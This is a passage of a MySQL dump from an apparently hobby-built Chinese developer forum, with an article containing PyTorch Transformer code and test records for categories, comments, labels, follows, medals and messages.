pre;\"> </span>):</p>\n<p><span style=\"white-space: pre;\"> </span>super(Transformer, self).__init__()</p>\n<p><span style=\"white-space: pre;\"> </span>self.encoder = Encoder(</p>\n<p><span style=\"white-space: pre;\"> </span>src_vocab_size,</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size,</p>\n<p><span style=\"white-space: pre;\"> </span>num_layers,</p>\n<p><span style=\"white-space: pre;\"> </span>heads,</p>\n<p><span style=\"white-space: pre;\"> </span>device,</p>\n<p><span style=\"white-space: pre;\"> </span>forward_expansion,</p>\n<p><span style=\"white-space: pre;\"> </span>dropout,</p>\n<p><span style=\"white-space: pre;\"> </span>max_length</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p><span style=\"white-space: pre;\"> </span>self.decoder = Decoder(</p>\n<p><span style=\"white-space: pre;\"> </span>trg_vocab_size,</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size,</p>\n<p><span style=\"white-space: pre;\"> </span>num_layers,</p>\n<p><span style=\"white-space: pre;\"> </span>heads,</p>\n<p><span style=\"white-space: pre;\"> </span>forward_expansion,</p>\n<p><span style=\"white-space: pre;\"> </span>dropout,</p>\n<p><span style=\"white-space: pre;\"> </span>device,</p>\n<p><span style=\"white-space: pre;\"> </span>max_length</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>self.src_pad_idx = src_pad_idx</p>\n<p><span style=\"white-space: pre;\"> </span>self.trg_pad_idx = trg_pad_idx</p>\n<p><span style=\"white-space: pre;\"> </span>self.device = device</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def make_src_mask(self, src):</p>\n<p><span style=\"white-space: pre;\"> </span>src_mask = (src != self.src_pad_idx).unsqueeze(1).unsqueeze(2)</p>\n<p><span style=\"white-space: pre;\"> </span># (N, 1, 1, src_len)</p>\n<p><span style=\"white-space: pre;\"> </span>return src_mask.to(self.device)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def make_trg_mask(self, trg):</p>\n<p><span style=\"white-space: pre;\"> </span>N, trg_len = trg.shape</p>\n<p><span style=\"white-space: pre;\"> </span>trg_mask = torch.tril(torch.ones((trg_len, trg_len))).expand(</p>\n<p><span style=\"white-space: pre;\"> </span>N, 1, trg_len, trg_len</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p><span style=\"white-space: pre;\"> </span>return trg_mask.to(self.device)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def forward(self, src, trg):</p>\n<p><span style=\"white-space: pre;\"> </span>src_mask = self.make_src_mask(src)</p>\n<p><span style=\"white-space: pre;\"> </span>trg_mask = self.make_trg_mask(trg)</p>\n<p><span style=\"white-space: pre;\"> </span>enc_src = self.encoder(src, src_mask)</p>\n<p><span style=\"white-space: pre;\"> </span>out = self.decoder(trg, enc_src, src_mask, trg_mask)</p>\n<p><span style=\"white-space: pre;\"> </span>return out</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>if __name__ == \'__main__\':</p>\n<p><span style=\"white-space: pre;\"> </span>device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")</p>\n<p><span style=\"white-space: pre;\"> </span>print(device)</p>\n<p><span style=\"white-space: pre;\"> </span>x = torch.tensor([[1,5,6,4,3,9,5,2,0],[1,8,7,3,4,5,6,7,2]]).to(device)</p>\n<p><span style=\"white-space: pre;\"> </span>trg = torch.tensor([[1,7,4,3,5,9,2,0],[1,5,6,2,4,7,6,2]]).to(device)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>src_pad_idx = 0</p>\n<p><span style=\"white-space: pre;\"> </span>trg_pad_idx = 0</p>\n<p><span style=\"white-space: pre;\"> </span>src_vocab_size = 10</p>\n<p><span style=\"white-space: pre;\"> </span>trg_vocab_size = 10</p>\n<p><span style=\"white-space: pre;\"> </span>model = Transformer(src_vocab_size, trg_vocab_size, src_pad_idx, trg_pad_idx, device=device).to(device)</p>\n<p><span style=\"white-space: pre;\"> </span>out = model(x, trg[:, : -1])</p>\n<p><span style=\"white-space: pre;\"> </span>print(out.shape)</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>\n<p>版权声明：本文为CSDN博主「鬼道2022」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</p>\n<p>原文链接：https://blog.csdn.net/qq_38406029/article/details/122050257</p>', '', 6, ',5,', '原创', '公开', '待审核', '', 6, '', '', 0, '2022-01-03 23:07:59', '2022-01-03 23:07:59');
INSERT INTO `article` VALUES (45, 'qwe', 6, '', '<p>qwe</p>', '', 1, ',1,', '原创', '公开', '已发布', '', 0, '', '', 0, '2022-02-10 23:03:37', '2022-02-10 23:10:08');

-- ----------------------------
-- Table structure for category
-- ----------------------------
DROP TABLE IF EXISTS `category`;
CREATE TABLE `category`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `category` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '类别',
  `rootid` int(11) NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 28 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of category
-- ----------------------------
INSERT INTO `category` VALUES (1, 'HarmonyOS', 2, '2021-12-01 21:21:23', '2021-12-01 21:21:23');
INSERT INTO `category` VALUES (2, 'Python', 3, '2021-12-01 21:22:45', '2021-12-01 21:22:45');
INSERT INTO `category` VALUES (3, '编程语言', 3, '2021-12-01 21:22:59', '2021-12-17 00:51:59');
INSERT INTO `category` VALUES (4, '后端', 3, '2021-12-01 21:23:14', '2021-12-01 21:23:14');
INSERT INTO `category` VALUES (5, 'Java', 3, '2021-12-01 21:23:27', '2021-12-01 21:23:27');
INSERT INTO `category` VALUES (6, '开发工具', 4, '2021-12-01 21:23:35', '2021-12-01 21:23:35');
INSERT INTO `category` VALUES (7, '移动开发', 4, '2021-12-01 21:23:51', '2021-12-01 21:23:51');
INSERT INTO `category` VALUES (8, '前端', 3, '2021-12-01 21:24:07', '2021-12-01 21:24:07');
INSERT INTO `category` VALUES (9, '操作系统', 4, '2021-12-01 21:24:26', '2021-12-01 21:24:26');
INSERT INTO `category` VALUES (10, '数据结构与算法', 4, '2021-12-01 21:24:41', '2021-12-01 21:24:41');
INSERT INTO `category` VALUES (11, '数学', 4, '2021-12-01 21:24:50', '2021-12-01 21:24:50');
INSERT INTO `category` VALUES (12, '大数据', 4, '2021-12-01 21:24:54', '2021-12-01 21:24:54');
INSERT INTO `category` VALUES (13, '数据库管理', 3, '2021-12-01 21:25:09', '2021-12-01 21:25:09');
INSERT INTO `category` VALUES (14, '游戏', 3, '2021-12-01 21:25:18', '2021-12-01 21:25:18');
INSERT INTO `category` VALUES (15, '人工智能', 4, '2021-12-01 21:25:25', '2021-12-01 21:25:25');
INSERT INTO `category` VALUES (16, '网络', 4, '2021-12-01 21:25:31', '2021-12-01 21:25:31');
INSERT INTO `category` VALUES (17, '硬件开发', 4, '2021-12-01 21:26:08', '2021-12-01 21:26:08');
INSERT INTO `category` VALUES (18, '安全', 4, '2021-12-01 21:26:15', '2021-12-01 21:26:15');
INSERT INTO `category` VALUES (19, '服务器', 4, '2021-12-01 21:26:20', '2021-12-01 21:26:20');
INSERT INTO `category` VALUES (20, '其他', 4, '2021-12-01 21:26:25', '2022-01-16 21:42:06');
INSERT INTO `category` VALUES (21, 'Media', 1, '2021-12-17 00:14:54', '2021-12-17 00:14:54');
INSERT INTO `category` VALUES (25, '-', 4, '2022-01-16 22:01:03', '2022-01-16 22:01:12');
INSERT INTO `category` VALUES (27, '--', 2, '2022-02-08 02:11:05', '2022-02-08 02:11:05');

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `comment` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `userid` int(11) NULL DEFAULT NULL,
  `articleid` int(11) NULL DEFAULT NULL,
  `comid` int(11) NULL DEFAULT NULL,
  `status` int(1) NULL DEFAULT NULL,
  `createtime` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 45 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of comment
-- ----------------------------
INSERT INTO `comment` VALUES (1, '写的好哇！', 1, 1, 0, 1, '2021-12-21 20:12:13');
INSERT INTO `comment` VALUES (2, '写的太好啦！！', 2, 1, 0, 1, '2021-12-21 20:14:13');
INSERT INTO `comment` VALUES (3, '我还是个新人，不懂怎么评论(✿◡‿◡)', 17, 1, 0, 1, '2021-12-21 20:14:13');
INSERT INTO `comment` VALUES (4, '还是你写的好呀', 10, 1, 1, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (5, '我是卡布叻.周深', 15, 1, 4, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (6, '我的代号是18', 18, 1, 5, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (7, '咩咩咩', 2, 1, 2, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (8, '我。。。', 10, 1, 7, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (9, '唯一', 1, 1, 8, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (10, '不道编啥勒', 3, 1, 3, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (11, '测试的先编到这，就这样吧', 2, 1, 10, 1, '2021-12-23 23:43:13');
INSERT INTO `comment` VALUES (12, '<p>哎</p>', 1, 1, 0, 1, '2021-12-30 20:05:05');
INSERT INTO `comment` VALUES (13, '<div>\n<p data-pid=\"dB4f24Cy\">对我来说，便是&mdash;&mdash;求而不得，念而无望。</p>\n<p data-pid=\"Nd5AfjE3\">我本身性格就是偏执、固执那一类的，喜欢的东西却得不到，爱的人却无法拥有，最是意难平。</p>\n<p data-pid=\"ekzHDqJa\">夜晚的时候，会无法入睡，略显焦躁，心里空洞的可怕，甚至会觉得呼吸不畅，这些都是身体表现出来的外在，然而真正最痛苦的却是内心，因为不能倾泄，也不能改变。</p>\n<p data-pid=\"NE83s4Mv\">总结起来，最根本的源头都来自于我对未来的无望。我不能通过任何方式去改变，因为有些东西已经成了最绝望的现实。改变不了，努力也无济于事。</p>\n<p data-pid=\"_SmNtM6E\">明知道不能过分在意，明知道无法改变，明知道该洒脱一点，可就是无法过自己心底里那一关，不能不在意，潇洒不了。一块石头压在心上，如何平了自己的意。</p>\n<p data-pid=\"McV0tTrV\">就像自己呕心沥血付出了所有，转眼却是一场空，攒着一口气使出浑身解数，却打在了棉花上。</p>\n<p data-pid=\"nfifI6iI\">就这样吧(._.)</p>\n</div>', 1, 1, 0, 1, '2021-12-30 20:09:22');
INSERT INTO `comment` VALUES (14, '<p><span style=\"color: #121212; font-family: -apple-system, BlinkMacSystemFont, \'Helvetica Neue\', \'PingFang SC\', \'Microsoft YaHei\', \'Source Han Sans SC\', \'Noto Sans CJK SC\', \'WenQuanYi Micro Hei\', sans-serif; font-size: 15px; background-color: #ffffff;\">&ldquo;筵席已散，众人已走远，而你在众人之中， 暮色深浓，无法再辨认，不会再相逢。&rdquo;</span></p>', 1, 1, 0, 1, '2021-12-30 20:21:07');
INSERT INTO `comment` VALUES (15, '我......', 1, 1, 0, 1, '2021-12-30 21:50:08');
INSERT INTO `comment` VALUES (16, '我...', 1, 1, 4, 1, '2021-12-30 21:53:17');
INSERT INTO `comment` VALUES (17, '几层啦', 1, 1, 6, 1, '2021-12-30 21:57:55');
INSERT INTO `comment` VALUES (18, '<div>\n<p style=\"text-align: center;\" data-pid=\"KPCSIhki\">&ldquo;筵席已散，众人已走远，而你在众人之中， 暮色深浓，无法再辨认，不会再相逢。&rdquo;</p>\n<p style=\"text-align: center;\" data-pid=\"9twlscZU\">路过山水千程，祝自己和温柔重逢。</p>\n<p style=\"text-align: center;\" data-pid=\"t9_-DD_-\">我知道世事无常，可也有个词叫来日方长。</p>\n<p style=\"text-align: center;\" data-pid=\"6sd_CsiF\">书上说过&ldquo;<em>人生没有不散的宴席</em>&rdquo;，但书上也说&ldquo;人生何处不相逢&rdquo;。她说过就当我去了一趟远方。</p>\n<p style=\"text-align: center;\" data-pid=\"UaYLEl39\">现在的我啊总是太固执，希望老了不会如此，又害怕到时候不是如此。</p>\n</div>', 1, 1, 0, 1, '2021-12-30 22:14:09');
INSERT INTO `comment` VALUES (19, 'The furthest distance in the world\nIs not when I stand in front of you\nYou don\'t know I love you\nIt is when my love is bewildering the soul\nBut I can\'t speak it out', 2, 1, 12, 1, '2021-12-30 22:35:12');
INSERT INTO `comment` VALUES (20, '你', 1, 1, 15, 1, '2022-01-03 18:24:11');
INSERT INTO `comment` VALUES (21, '<p style=\"text-align: right;\"><span style=\"background-color: #fbeeb8;\">学到了学到了</span></p>', 1, 2, 0, 1, '2022-01-03 23:22:25');
INSERT INTO `comment` VALUES (22, '是呀', 2, 2, 21, 1, '2022-01-03 23:24:20');
INSERT INTO `comment` VALUES (23, '<p>涨知识了</p>', 2, 2, 0, 1, '2022-01-03 23:24:35');
INSERT INTO `comment` VALUES (24, '<p>我是小羊</p>', 2, 1, 0, 1, '2022-01-03 23:25:34');
INSERT INTO `comment` VALUES (25, '<p>不对劲啊</p>', 2, 2, 0, 1, '2022-01-03 23:26:25');
INSERT INTO `comment` VALUES (26, '<p>再试一次</p>', 2, 3, 0, 1, '2022-01-03 23:27:36');
INSERT INTO `comment` VALUES (27, '<p>这次应该行啦</p>', 2, 13, 0, 1, '2022-01-03 23:31:30');
INSERT INTO `comment` VALUES (28, '<p>看看回复哪去了</p>', 2, 13, 0, 1, '2022-01-03 23:31:53');
INSERT INTO `comment` VALUES (29, '怎么有点数赞呢...？？', 2, 3, 26, 1, '2022-01-04 20:14:32');
INSERT INTO `comment` VALUES (30, '<p>三连了</p>', 1, 13, 0, 1, '2022-01-06 00:57:58');
INSERT INTO `comment` VALUES (31, '<p>点赞又不好使了</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"http://127.0.0.1:8080/upload/image/comment/2022/1/6/159d9d60-bf19-4c94-99b0-733ab97a1996.png\" alt=\"\" width=\"65\" height=\"36\" /></p>', 1, 1, 0, 1, '2022-01-06 16:18:42');
INSERT INTO `comment` VALUES (32, '<p>好啦</p>', 2, 38, 0, 1, '2022-01-06 16:59:41');
INSERT INTO `comment` VALUES (33, '<h1><span style=\"color: #e67e23;\"><em>YES</em></span></h1>', 2, 38, 0, 1, '2022-01-06 17:00:26');
INSERT INTO `comment` VALUES (34, '<blockquote>\n<p><span style=\"text-decoration: underline; color: #843fa1;\">天呐！太厉害啦！！！</span></p>\n</blockquote>', 2, 5, 0, 1, '2022-01-06 20:22:08');
INSERT INTO `comment` VALUES (35, '<p>s打赏</p>', 1, 13, 0, 0, '2022-02-06 23:19:04');
INSERT INTO `comment` VALUES (36, '；', 1, 13, 35, 0, '2022-02-06 23:39:54');
INSERT INTO `comment` VALUES (37, '；654', 1, 13, 35, 0, '2022-02-06 23:39:59');
INSERT INTO `comment` VALUES (38, '讲话稿', 1, 13, 36, 0, '2022-02-06 23:40:10');

-- ----------------------------
-- Table structure for follow
-- ----------------------------
DROP TABLE IF EXISTS `follow`;
CREATE TABLE `follow`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NULL DEFAULT NULL,
  `datasource` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `dataid` int(11) NULL DEFAULT NULL,
  `createtime` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 75 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of follow
-- ----------------------------
INSERT INTO `follow` VALUES (6, 2, 'user', 17, '2022-1-6 01:01:13');
INSERT INTO `follow` VALUES (16, 2, 'article', 1, '2022-1-7 01:01:13');
INSERT INTO `follow` VALUES (48, 1, 'article', 3, '2022-1-9 01:01:13');
INSERT INTO `follow` VALUES (62, 2, 'user', 11, '2022-1-10 01:01:13');
INSERT INTO `follow` VALUES (63, 2, 'user', 1, '2022-1-10 01:01:13');
INSERT INTO `follow` VALUES (64, 2, 'user', 4, '2022-1-10 01:01:13');
INSERT INTO `follow` VALUES (65, 2, 'article', 5, '2022-1-10 01:01:13');
INSERT INTO `follow` VALUES (67, 1, 'article', 13, '2022-1-11 20:48:13');
INSERT INTO `follow` VALUES (68, 1, 'article', 1, '2022-1-11 20:49:13');
INSERT INTO `follow` VALUES (74, 1, 'user', 2, '2022-01-11 22:28:04');

-- ----------------------------
-- Table structure for integral
-- ----------------------------
DROP TABLE IF EXISTS `integral`;
CREATE TABLE `integral`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NULL DEFAULT NULL,
  `grow` int(11) NULL DEFAULT NULL,
  `integral` int(11) NULL DEFAULT NULL,
  `describe` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of integral
-- ----------------------------
INSERT INTO `integral` VALUES (1, 1, -1, -1, '点赞（主题贴/回复）', '2021/11/01 19:26:47');

-- ----------------------------
-- Table structure for label
-- ----------------------------
DROP TABLE IF EXISTS `label`;
CREATE TABLE `label`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `label` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '标签',
  `categoryid` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '所属类别',
  `describe` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '简介',
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 64 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of label
-- ----------------------------
INSERT INTO `label` VALUES (1, '应用/服务开发', ',1,', '简介', '2021-12-01 21:30:14', '2021-12-01 21:30:14');
INSERT INTO `label` VALUES (2, '设备开发', ',1,', '简介', '2021-12-01 21:30:36', '2021-12-01 21:30:36');
INSERT INTO `label` VALUES (3, 'HarmonyOS Connect', ',1,', '简介', '2021-12-01 21:30:51', '2022-01-16 19:25:50');
INSERT INTO `label` VALUES (4, 'HMS Core', ',1,', '简介', '2021-12-01 21:31:25', '2021-12-01 21:31:25');
INSERT INTO `label` VALUES (5, 'python', ',2,3,4,', '简介', '2021-12-01 21:32:22', '2021-12-01 21:32:22');
INSERT INTO `label` VALUES (6, 'django', ',2,4,', '简介', '2021-12-01 21:32:40', '2021-12-01 21:32:40');
INSERT INTO `label` VALUES (7, 'java', ',3,4,', '简介', '2021-12-01 21:33:17', '2021-12-01 21:33:17');
INSERT INTO `label` VALUES (8, 'C/C++', ',3,4,', '简介', '2021-12-01 21:33:35', '2021-12-01 21:33:35');
INSERT INTO `label` VALUES (9, 'C#', ',3,4,', '简介', '2021-12-01 21:33:40', '2021-12-01 21:33:40');
INSERT INTO `label` VALUES (10, 'php', ',3,4,', '简介', '2021-12-01 21:33:53', '2021-12-01 21:33:53');
INSERT INTO `label` VALUES (11, 'JavaScript', ',3,8,', '简介', '2021-12-01 21:34:15', '2021-12-01 21:34:15');
INSERT INTO `label` VALUES (12, 'qt', ',17,3,', '简介', '2021-12-01 21:34:48', '2021-12-01 21:34:48');
INSERT INTO `label` VALUES (13, 'spring', ',5,', '简介', '2021-12-01 21:39:03', '2021-12-01 21:39:03');
INSERT INTO `label` VALUES (14, 'springMVC', ',5,', '简介', '2021-12-01 21:39:08', '2021-12-01 21:39:08');
INSERT INTO `label` VALUES (15, 'mybatis', ',13,', '简介', '2021-12-01 21:39:25', '2021-12-01 21:39:25');
INSERT INTO `label` VALUES (16, 'tomcat', ',5,4,', '简介', '2021-12-01 21:39:56', '2021-12-01 21:39:56');
INSERT INTO `label` VALUES (17, 'maven', ',4,', '简介', '2021-12-01 21:40:16', '2021-12-01 21:40:16');
INSERT INTO `label` VALUES (18, 'pycharm', ',6,', '简介', '2021-12-01 21:41:35', '2021-12-01 21:41:35');
INSERT INTO `label` VALUES (19, 'idea', ',6,', '简介', '2021-12-01 21:41:47', '2021-12-01 21:41:47');
INSERT INTO `label` VALUES (20, 'phpstorm', ',6,', '简介', '2021-12-01 21:42:38', '2021-12-01 21:42:38');
INSERT INTO `label` VALUES (21, 'vscode', ',6,', '简介', '2021-12-01 21:42:44', '2021-12-01 21:42:44');
INSERT INTO `label` VALUES (22, 'vs', ',6,', '简介', '2021-12-01 21:43:04', '2021-12-01 21:43:04');
INSERT INTO `label` VALUES (23, 'Android', ',7,3,', '简介', '2021-12-01 21:43:37', '2021-12-01 21:43:37');
INSERT INTO `label` VALUES (24, 'css', ',7,3,', '简介', '2021-12-01 21:44:21', '2021-12-01 21:44:21');
INSERT INTO `label` VALUES (25, 'node.js', ',7,3,', '简介', '2021-12-01 21:44:32', '2021-12-01 21:44:32');
INSERT INTO `label` VALUES (26, 'npm', ',7,3,', '简介', '2021-12-01 21:44:38', '2021-12-01 21:44:38');
INSERT INTO `label` VALUES (27, 'vue', ',8,', '简介', '2021-12-01 21:44:58', '2021-12-01 21:44:58');
INSERT INTO `label` VALUES (28, 'HarmonyOS', ',3,', '简介', '2021-12-01 22:39:54', '2021-12-01 22:39:54');
INSERT INTO `label` VALUES (29, '线性代数', ',10,', '简介', '2021-12-05 21:45:51', '2021-12-05 21:45:51');
INSERT INTO `label` VALUES (30, '统计学', ',11,', '简介', '2021-12-05 21:52:02', '2021-12-05 21:52:02');
INSERT INTO `label` VALUES (31, '数据分析', ',11,15,', '简介', '2021-12-05 21:52:18', '2021-12-05 21:52:18');
INSERT INTO `label` VALUES (32, '假设检验', ',11,15,', '简介', '2021-12-05 21:52:27', '2021-12-05 21:52:27');
INSERT INTO `label` VALUES (33, '拟合优度检验', ',15,', '简介', '2021-12-05 21:52:45', '2021-12-05 21:52:45');
INSERT INTO `label` VALUES (34, '图像处理', ',15,2,', '简介', '2021-12-05 21:54:32', '2021-12-05 21:54:32');
INSERT INTO `label` VALUES (35, 'redis', ',10,13,', '简介', '2021-12-05 22:08:52', '2021-12-05 22:08:52');
INSERT INTO `label` VALUES (36, 'UE4', ',14,', '简介', '2021-12-05 22:19:22', '2021-12-05 22:19:22');
INSERT INTO `label` VALUES (37, '网络协议', ',16,18,19,', '简介', '2021-12-05 22:23:25', '2021-12-05 22:23:25');
INSERT INTO `label` VALUES (38, '网络安全', ',16,18,', '简介', '2021-12-05 22:24:11', '2021-12-05 22:24:11');
INSERT INTO `label` VALUES (39, '网络漏洞', ',16,18,5,', '简介', '2021-12-05 22:31:30', '2021-12-05 22:31:30');
INSERT INTO `label` VALUES (40, '操作系统', ',9,', '简介', '2021-12-05 22:36:08', '2021-12-05 22:36:08');
INSERT INTO `label` VALUES (41, 'JDK', ',5,', '简介', '2021-12-05 22:39:20', '2021-12-05 22:39:20');
INSERT INTO `label` VALUES (42, '其他', ',20,', '简介', '2021-12-05 22:49:47', '2021-12-05 22:49:47');
INSERT INTO `label` VALUES (43, '111', ',2,3,', '简介', '2022-01-13 22:17:47', '2022-01-16 20:02:21');
INSERT INTO `label` VALUES (56, '搜索', ',1,', NULL, '2022-01-16 21:11:03', '2022-01-16 21:11:03');
INSERT INTO `label` VALUES (57, '-', ',1,2,', NULL, '2022-01-16 21:14:27', '2022-01-16 22:03:35');
INSERT INTO `label` VALUES (62, '123213', ',25,', NULL, '2022-01-16 21:03:01', '2022-01-16 21:03:01');
INSERT INTO `label` VALUES (63, 'asdsad', ',1,', 'asdasdsad', '2022-01-16 22:39:41', '2022-01-16 22:39:41');

-- ----------------------------
-- Table structure for medal
-- ----------------------------
DROP TABLE IF EXISTS `medal`;
CREATE TABLE `medal`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '勋章名称',
  `medal` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '勋章图标路径',
  `describe` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '描述',
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of medal
-- ----------------------------
INSERT INTO `medal` VALUES (1, '官方认证', 'https://fuss10.elemecdn.com/a/3f/3302e58f9a181d2509f3dc0fa68b0jpeg.jpeg', '官方认证账号', '2022-2-7 23:23:13', '2022-2-7 23:23:13');
INSERT INTO `medal` VALUES (2, '受欢迎者', 'https://fuss10.elemecdn.com/a/3f/3302e58f9a181d2509f3dc0fa68b0jpeg.jpeg', '粉丝数达到500/1000/2000及以上', '2022-2-7 23:23:13', '2022-2-7 23:23:13');
INSERT INTO `medal` VALUES (3, '1', 'https://fuss10.elemecdn.com/a/3f/3302e58f9a181d2509f3dc0fa68b0jpeg.jpeg', '1', '2022-2-7 23:23:13', '2022-2-7 23:23:13');
INSERT INTO `medal` VALUES (4, '12', 'http://127.0.0.1:8080/upload/image/medal/2022/2/11/9e5c06ef-65d2-4a56-889d-f686dc4c1c2c.png', '12', '2022-2-7 23:23:13', '2022-02-11 17:11:34');
INSERT INTO `medal` VALUES (9, '123', 'http://127.0.0.1:8080/upload/image/medal/2022/2/11/ece34df6-07b2-4f20-865e-1ebc4347c9ff.png', '', '2022-02-11 16:41:01', '2022-02-11 16:41:56');

-- ----------------------------
-- Table structure for message
-- ----------------------------
DROP TABLE IF EXISTS `message`;
CREATE TABLE `message`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `senderuid` int(11) NULL DEFAULT NULL,
  `receiveuid` int(11) NULL DEFAULT NULL,
  `content` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `read` int(1) NULL DEFAULT NULL,
  `addition` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `type` int(1) NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of message
-- ----------------------------
INSERT INTO `message` VALUES (1, 1, 2, '您好！您已经注册成为华为开发者论坛的会员，请您在发表言论时，遵守当地法律法规。如果您有什么疑问可以联系管理员。', 1, NULL, 1, '2021/10/22 18:56:39');
INSERT INTO `message` VALUES (2, 2, 1, '尊敬的开发者，您好！恭喜您获得 论坛周最佳互动者 勋章！', 0, NULL, 1, '2022/01/10 01:00:00');
INSERT INTO `message` VALUES (3, 3, 4, '343434', 0, NULL, 0, '2022-2-8 21:56:13');

-- ----------------------------
-- Table structure for plate
-- ----------------------------
DROP TABLE IF EXISTS `plate`;
CREATE TABLE `plate`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `plate` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `ancestor` int(11) NULL DEFAULT NULL,
  `icon` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `describe` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,
  `createtime` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 19 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

